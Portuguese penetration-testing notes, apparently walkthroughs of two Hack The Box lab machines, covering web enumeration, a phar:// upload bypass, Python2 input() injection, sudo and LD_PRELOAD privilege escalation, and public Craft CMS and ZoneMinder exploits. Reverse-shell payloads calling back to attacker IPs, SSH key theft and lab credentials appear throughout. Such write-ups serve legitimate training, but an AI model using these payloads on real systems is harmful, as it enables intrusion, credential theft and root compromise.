        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2071.png)
        
        Apenas vemos duas portas `ssh` e `http` 
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2072.png)
        
        Analisando o site vemos que existe upload de ficheiros.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2073.png)
        
        O debug mode danos uma outra prepetiva sobre os pedido feitos pelo site. 
        
        `ffuf -u [http://siteisup.htb](http://siteisup.htb/) -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/subdomains.txt`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2074.png)
        
        Vemos que desta forma não estamos a conseguir enumerar da maneira que queremos por isso vamos utilizar alguns filtros, escondemos todos os sites com size igual a 1131. 
        
        `ffuf -u [http://siteisup.htb](http://siteisup.htb/) -H "Host: FUZZ.siteisup.htb" -w
        /usr/share/wordlists/subdomains.txt -fs 1131`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2075.png)
        
        Desta forma podemos ver que existe uma virtual host escondido.
        
        Depois de encontramos o virtual host vamos fazer uma listagem de potenciais ficheiros ou diretorias. 
        
        `gobuster dir -u [http://siteisup.htb/](http://siteisup.htb/) -w /usr/share/wordlists/dirb/common.txt`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2076.png)
        
        Encontramos uma diretoria dev, por isso vamos enumerar mais esta diretoria.
        
        `gobuster dir -u [http://siteisup.htb/dev](http://siteisup.htb/dev) -w /usr/share/wordlists/dirb/common.txt`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2077.png)
        
        Encontramos uma diretoria git, e vamos utilizar a ferramenta git-dump para extrair os dados.
        
        [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)
        
        `git-dumper http://siteisup.htb/dev/.git dev`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2078.png)
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2079.png)
        
        Para conseguir aceder ao site `dev.siteisup.htb` temos de colocar um header no pedido para conseguir contornar.
        
        Como referido, precisamos de adicionar o cabeçalho HTTP especial para obter acesso ao subdomínio. Poderíamos fazer isso manualmente para cada solicitação, mas o BurpSuite nos permite automatizar essa tarefa adicionando uma entrada na seção Proxy -> Options, na seção Match and Replace. Nós adicionamos uma nova entrada, e deixando o campo Match vazio, ele simplesmente adicionará um novo cabeçalho (que definimos no campo Replace) a cada pedido.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2080.png)
        
        Agora já podemos utilizar o virtual host que encontramos, utilizando o BurpSuite como proxy e desligando a interseção.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2081.png)
        
        Ao contrário do site inicial, esta versão beta requer um ficheiro com uma lista de sites a verificar. Podemos encontrar o código-fonte desta aplicação web dev no diretório que descarregámos anteriormente durante a fase de enumeração.
        Vamos começar dando uma olhada no `index.php`.
        
        ```bash
        <b>This is only for developers</b>
        <br>
        <a href="?page=admin">Admin Panel</a>
        <?php
        	define("DIRECTACCESS",false);
        	$page=$_GET['page'];
        	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
        					include($_GET['page'] . ".php");
        		 }else{
        					include("checker.php");
        	 }
        ?>
        ```
        
        O código fonte utiliza a função `PHP include()`. Esta função é considerada perigosa, uma vez que pode levar à inclusão de ficheiros locais ou mesmo à execução remota de código. Existe um filtro na inclusão de `$_GET['page']` , que nos impede de aceder a determinadas directorias como `/etc` e `/home` . Se nenhum parâmetro GET de página for fornecido, a página incluirá `checker.php` . Vamos dar uma olhada no código-fonte dessa página
        seguinte.
        
        ```bash
        <...SNIP...>
        if($_POST['check']){
        		# File size must be less than 10kb.
        		if ($_FILES['file']['size'] > 10000) {
        		die("File too large!");
        }
        			$file = $_FILES['file']['name'];
        			# Check if extension is allowed.
        			$ext = getExtension($file);
        			if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
        			die("Extension not allowed!");
        }
        			# Create directory to upload our file.
        			$dir = "uploads/".md5(time())."/";
        			if(!is_dir($dir)){
        			mkdir($dir, 0770, true);
        			 }
        # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
        # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));
        foreach($websites as $site){
        $site=trim($site);
        if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site)
        && !preg_match("#ftp://#i",$site)){
        $check=isitup($site);
        if($check){
        echo "<center>{$site}<br><font color='green'>is up
        ^_^</font></center>";
         }else{
        echo "<center>{$site}<br><font color='red'>seems to be
        down :(</font></center>";
         }
         }else{
        echo "<center><font color='red'>Hacking attempt was detected !
        </font></center>";
         }
         }
        # Delete the uploaded file.
        @unlink($final_path);
        }
        </...SNIP...>
        ```
        
        Ao carregar um ficheiro, o código verifica primeiro se o seu tamanho é inferior a 10kb . Em seguida, verifica se existem extensões de ficheiros não permitidas e cria um diretório onde armazena o ficheiro carregado. Por último, percorre os sítios Web encontrados no ficheiro, verificando se estão activos, e depois elimina o ficheiro do servidor.
        Embora a lógica por detrás da aplicação web coloque na lista negra extensões como `.php` e `.py`, não verifica a existência de ficheiros `.phar`, que é um formato de pacote para ficheiros PHP agrupados e que pode ser tão eficaz como os ficheiros PHP normais para a execução remota de código. Do ponto de vista da equipa azul, é por isso que muitas vezes é mais seguro colocar certas extensões na lista branca, em vez de tentar colocar na lista negra todas as extensões potencialmente maliciosas.
        Vamos criar um ficheiro PHP que chama a função `phpinfo()` e guardá-lo como info.php .
        
        `echo "<?php phpinfo(); ?>" > info.php`
        
        Em seguida, comprimimo-lo num ficheiro chamado info.zip e mudamos o nome para info.txt, uma vez que a extensão `.zip` está na lista negra do código-fonte acima. Quanto ao motivo pelo qual estamos a comprimir o ficheiro, fazemo-lo para podermos utilizar o wrapper `PHP phar://` assim que o ficheiro for carregado, de modo a aceder ao conteúdo do arquivo comprimido, nomeadamente ao nosso payload `phpinfo()`.
        
        `zip info.zip info.php`
        `mv info.zip info.txt`
        
        Carregamos o ficheiro info.txt com sucesso e navegamos para `http://dev.siteisup.htb/uploads/` , onde podemos encontrar um diretório que, presumivelmente, aloja o nosso payload.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2082.png)
        
        É aqui que utilizamos o wrapper `phar://` e accionamos a nossa carga útil navegando para
        `http://dev.siteisup.htb/?page=phar://uploads/f4ffea0fb8f7269a2cca12cd1b266e58/info.txt/info` , que nos mostra com sucesso a saída do comando `phpinfo()`.
        
        Isto significa que existe uma Execução Remota de Código, uma vez que podemos executar código PHP arbitrário. Infelizmente, a página de informações do PHP revela que algumas funções como `system()`, `shell_exec()`, e `popen()` estão desativadas, o que significa que que teremos de encontrar uma abordagem diferente para ganhar uma posição no alvo.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2083.png)
        
        Uma pesquisa na Internet com as palavras-chave php , `disabled_functions` , e bypass leva-nos a uma ferramenta chamada `dfunc-bypasser`, que automaticamente percorre um conjunto de funções ditas perigosas que poderiam levar a uma shell inversa, e verifica se alguma delas está activada no alvo. Antes de executarmos a ferramenta, nós
        precisamos ter certeza de que ela usa o cabeçalho HTTP Special-Dev.
        
        Na linha 38 do ficheiro `defunct-bypasser.py`, encontramos o seguinte código:
        
        [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser)
        
        ```bash
        if(args.url): 
        	url = args.url
        	phpinfo = requests.get(url).text
        ```
        
        Adicionamos o cabeçalho como um parâmetro e continuamos a executar o script
        
        ```bash
        if(args.url): 
        		url = args.url
        		phpinfo = requests.get(url, headers={"Special-dev":"only4dev"}).text
        ```
        
        `python dfunc-bypasser.py --url 'http://dev.siteisup.htb/?
        page=phar://uploads/6723be7f59bf9a81d941ecfc3c1bb717/info.txt/info'`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2084.png)
        
        A saída do script sugere que podemos ser capazes de usar `proc_open` para executar comandos, já que a função não está desativada pelo nosso alvo. Lendo a documentação do PHP, descobrimos que `proc_open` é semelhante ao popen , e pode ser usado da mesma forma para executar comandos arbitrários. Prosseguimos para criar uma carga útil de shell invertida, usando esta função.
        
        [PHP: proc_open - Manual](https://www.php.net/manual/en/function.proc-open.php)
        
        ```bash
        <?php
        $descriptorspec = array(
        0 => array('pipe', 'r'), // stdin
        1 => array('pipe', 'w'), // stdout
        2 => array('pipe', 'a') // stderr
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'";
        $process = proc_open($cmd, $descriptorspec, $pipes, null, null);
        ?>
        ```
        
        Tal como antes, escrevemos o payload acima num ficheiro chamado `rev.php`, comprimimo-lo utilizando o comando zip, renomeamo-lo para uma extensão da lista branca como `.txt` e, finalmente, carregamos o ficheiro.
        
        `zip rev.zip rev.php`
        `mv rev.zip rev.txt`
        
         Configuramos um `Netcat` listener na porta `1337` e executamos o script da mesma forma que antes, utilizando o wrapper `phar://` e navegando para a pasta `/uploads` onde o nosso ficheiro está armazenado.
        
        `nc -lvnp 1337`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2085.png)
        
        Lateral Movement
        
        Depois de ganhar uma posição inicial, damos uma vista de olhos ao sistema. Lendo o conteúdo de `/etc/passwd`, descobrimos que existe um utilizador chamado developer.
        
        `cat /etc/passwd | grep -v -e false -e nologin -e sync`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2086.png)
        
        `cd /home/developer/`
        `ls -l`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2087.png)
        
        No diretório home existe uma pasta chamada dev , que é propriedade do grupo `www-data` . Vamos entrar nesta pasta e explorar o que ela contém.
        
        `cd dev/`
        `ls -l`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2088.png)
        
        Existem dois ficheiros na pasta dev; um script python e um executável `setuid`. Quando um executável tem a permissão setuid definida, ele será executado como o respetivo proprietário do ficheiro, neste caso developer. O conteúdo do script `Python` é o seguinte.
        
        ```python
        import requests
        url = input("Enter URL here:")
        page = requests.get(url)
        if page.status_code == 200:
        			print "Website is up"
        else:
        			print "Website is down"
        ```
        
        O script pede uma entrada para um URL utilizando a função `input()` incorporada. A função `input()` em `Python2` é conhecida por ser insegura, pois atua de forma semelhante à função `eval()`, que permite executar código como uma cadeia de caracteres.
        Podemos dizer que o script está a ser executado com `Python2` , uma vez que as instruções de impressão não têm parênteses. Podemos tentar explorar isso usando a seguinte entrada.
        
        `__import__('os').system('/bin/bash')`
        
        Esta string importa o módulo os e usa a função `system()` para executar comandos do sistema operacional. Vamos executar o executável `setuid` executável e tentar injetar o payload.
        
        `./siteisup`
        **`__import__**('os').system('/bin/bash')`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2089.png)
        
        O payload é executado com sucesso e obtemos uma shell como o utilizador programador. Podemos ler a chave SSH do usuário em `/home/developer/.ssh/id_rsa` e usar o SSH para uma base mais persistente.
        
        `cat /home/developer/.ssh/id_rsa`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2090.png)
        
        `chmod 600 id_rsa`
        `ssh -i id_rsa developer@siteisup.htb`
        
        Privilege Escalation
        
        Quando conectado com SSH, podemos tentar executar `sudo -l` para ver se o usuário desenvolvedor tem permissão para executar comandos com privilégios Sudo.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2091.png)
        
        A saída acima mostra que o usuário desenvolvedor pode executar o `easy_install` , sem uma senha. `GTFOBins` é um excelente site onde podemos procurar por comandos Linux que podem ser mal utilizados para ganhar um shell, ler/escrever em ficheiros, etc. A pesquisa por `easy_install` mostra que ele pode, de facto, ser abusado para gerar uma
        shell com privilégios elevados.
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2092.png)
        
        `TF=$(mktemp -d)`
        `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" >`
        `$TF/setup.py`
        `sudo easy_install $TF`
        
        ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2093.png)
        
    
- CMS vuln
    
    Enumeration
    
    ```bash
    └──╼ [★]$ nmap -T4 -sV -sC -p- 10.129.119.188
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-23 14:47 BST
    Nmap scan report for 10.129.119.188
    Host is up (0.082s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
    |_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://surveillance.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
    Encontramos duas portas abertas, 22 ssh e 80 com um redirect para `surveillance.htb`
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2094.png)
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2095.png)
    
    No site vemos que existe um `craft cms` , e depois de procurar por vulnerabilidade nest cms encontramos o seguinte `CVE`.
    
    [https://github.com/Faelian/CraftCMS_CVE-2023-41892](https://github.com/Faelian/CraftCMS_CVE-2023-41892)
    
    Com este script ganhamos acesso ao servidor. 
    
    `python3 [craft-cms.py](http://craft-cms.py/) [http://surveillance.htb/](http://surveillance.htb/)`
    
    Depois fazemos uma reverse shell utilizando o `bash -c`  
    
    Apos pesquisa encontramos um backup de uma base de dados `surveillance--2023-10-17-202801--v4.4.14.sql.zip`.
    
    Ao pesquisar neste ficheiro encontramos uma hash em sha256.
    
    `cat surveillance--2023-10-17-202801--v4.4.14.sql.zip| grep ‘Matthew’` 
    
    Credenciais
    
    `matthem:starcraft122490`
    
    Com estas credenciais temos acesso ssh á maquina.
    
    Na maquina encontramos um webserver na porta 8080. Fazemos o foward da porta para a nossa maquina, e reparamos que é uma pagina `login zoneminder.`
    
    Ao testar as credenciais que obtivemos reparamos que o utilizador admin tem a password que que deciframos anteriormente.
    
    `admin:starcraft122490` 
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2096.png)
    
    A versão do `Zoneminder` é `1.36.32` 
    
    [https://github.com/heapbytes/CVE-2023-26035](https://github.com/heapbytes/CVE-2023-26035)
    
    Encontramos uma vulnerabilidade nesta versão.
    
    `python3 [poc.py](http://poc.py/)  --target [http://127.0.0.1:8080/](http://127.0.0.1:8080/) --cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.65 1234 >/tmp/f'` 
    
    Com este comando conseguimos uma reverse shell na maquina. Fazendo o comando `sudo -l` .
    
    ```bash
    zoneminder@surveillance:~$ sudo -l
    Matching Defaults entries for zoneminder on surveillance:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
    
    User zoneminder may run the following commands on surveillance:
        (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
    
    ```
    
    Vemos que consegue correr com `sudo` as seguintes script em `perl`.
    
    ![Untitled](Web%20ecc715b72427446285f5870cda3e13a2/Untitled%2097.png)
    
    Vemos que existe uma variável `LD_PRELOAD` e que podemos altera la.
    
    Primeiro fazemos um código em C. Para alterar as permissões do `/bin/bash`.
    
    ```c
    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>
    void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("chmod u+s /bin/bash");
    }
    ```
    
    `gcc -fPIC -shared -o shell main.c -nostartfiles`
    
    Executamos este comando para criar um ficheiro executável. Depois fazemos upload para a maquina. Dentro da maquina, procuramos qual é o script que contem o `LD_PRELOAD`, neste caso é o `zmdc.pl`. Utilizamos o seguinte comando para conseguir execução de codigo.
    
    `sudo /usr/bin/zmdc.pl startup zmdc`
    
    ```c
    zoneminder@surveillance:~$ sudo /usr/bin/zmdc.pl startup zmdc
    Starting server
    04/23/2024 15:43:24.555797 zmdc[17891].FAT [main:195] [Can't connect to [zmdc.pl](http://zmdc.pl/) server process at /run/zm/zmdc.sock: No such file or directory]
    ```
    
    Caso dê este erro, testar de outras formas. Só quando não der erro é que temos a certeza que executou com sucesso. 
    
    `sudo /usr/bin/zmdc.pl startup zmdc`
    
    Caso já esteja a ser executado o serviço 
    
    `sudo [zmdc.pl](http://zmdc.pl/) shutdown zmdc`
    `sudo [zmdc.pl](http://zmdc.pl/) startup zmdc`
    
    No final executamos: 
    
    `/bin/bash -p`
    
    ```bash
    zoneminder@surveillance:~$ /bin/bash -p
    bash-5.1# id
    uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) groups=1001(zoneminder)
    ```